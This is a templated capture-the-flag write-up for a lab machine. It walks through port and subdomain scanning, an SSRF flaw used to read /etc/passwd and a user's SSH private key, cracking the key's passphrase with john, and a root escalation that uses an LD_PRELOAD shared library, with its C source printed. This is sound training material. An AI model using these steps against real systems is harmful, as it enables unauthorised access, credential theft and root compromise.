{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We run a port scan.")}}

{{console("nmap -T5 -p- 10.10.200.176", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-06 20:17 CET
Nmap scan report for 10.10.200.176
Host is up (0.075s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 176.50 seconds")}}

{{text("We find two open ports.")}}

{{list(['22 (SSH)', '80 (HTTP)'])}}

{{text("We add an entry to our <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/hosts</code> file and we visit the web page.")}}

{{image("../../static/writeups/creative/images/000001.jpg")}}

{{text("We find nothing but a static website without anything interesting.")}}

{{text("I ran a directory scan but didn't find anything interesting. My next step is to scan the subdomains.")}}

{{console("ffuf -u http://10.10.200.176 -w /usr/share/wordlists/dirb/big.txt -H 'Host: FUZZ.creative.th' -fw 6", "
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.200.176
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Header           : Host: FUZZ.creative.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6
________________________________________________

beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 86ms]
:: Progress: [20469/20469] :: Job [1/1] :: 446 req/sec :: Duration: [0:00:45] :: Errors: 0 ::")}}

{{text("We add <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>beta.creative.thm</code> to our <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/hosts</code> file  and go to the subdomain.")}}

{{image("../../static/writeups/creative/images/000002.jpg")}}

{{header("Shell as saad", "shell-as-saad")}}

{{text("It is a URL tester that checks if the entered website is alive.")}}

{{text("It we input <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://localhost</code> we get back the HTML code of <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>creative.thm</code>. I wondered if I can use this to read files.")}}

{{text("I couldn't get it to read any other file. I thought that if I change the port I will be able to access a service that is unreacheable from the outside.")}}

{{text("I used Burp to scan through the ports and got a directory listing by using port <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>1337</code>.")}}

{{text("If we enter <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://127.0.0.1:1337</code> into the field, we get the directories.")}}

{{image("../../static/writeups/creative/images/000003.jpg")}}

{{text("We can check for existing users by entering <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://127.0.0.1:1337/etc/passwd</code>. We see that user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>saad</code> exists.")}}

{{text("While enumerating through that user's home directory, we read his <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>id_rsa</code> key and copy it onto our machine.")}}

{{text("We try to log in via SSH using this key, but it's password protected. We use <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>ssh2john</code> to crack it.")}}

{{console("ssh2john id_rsa > hash", "")}}

{{console("john hash --wordlist=/usr/share/wordlists/rockyou.txt", "Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetness        (id_rsa)     
1g 0:00:00:23 DONE (2024-12-06 21:59) 0.04173g/s 40.06p/s 40.06c/s 40.06C/s hawaii..sandy
Use the '--show' option to display all of the cracked passwords reliably
Session completed.")}}

{{text("Now we can log in as user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>saad</code>.")}}

{{header("Shell as root", "shell-as-root")}}

{{text("While looking through my user's home directory, I read his bash history file and found his password.")}}

{{console("cat .bash_history", "whoami
pwd
ls -al
ls
cd ..
sudo -l
echo 'saad:[REDACTED]' > creds.txt
rm creds.txt
sudo -l
whomai
whoami
pwd
ls -al
sudo -l
ls -al
pwd
whoami
...")}}

{{text("Thanks to that now we can check his sudo privilages.")}}

{{console("sudo -l", "Matching Defaults entries for saad on m4lware:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User saad may run the following commands on m4lware:
    (root) /usr/bin/ping")}}

{{text("We see that we are able to run ping as root, but I couldn't find a way to privilage escalate using that.")}}

{{text("We also notice the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>env_keep+=LD_PRELOAD</code> which after a quick search turns out to be exploitable.")}}

{{link("https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/", "https://www.hackingarticles.in/wp-includes/images/w-logo-blue-white-bg.png", "Linux Privilege Escalation using LD_Preload")}}

{{text("We create a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>shell.c</code> file in the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/tmp</code> directory.")}}

{{text("We add the code from the article to it.")}}

{{console("", "#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv('LD_PRELOAD');
setgid(0);
setuid(0);
system('/bin/sh');
}")}}

{{text("Now we need to compile it and run the ping as sudo with the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>LD_PRELOAD</code> variable pointing to our malicious library.")}}

{{image("../../static/writeups/creative/images/000004.jpg")}}

{{script()}}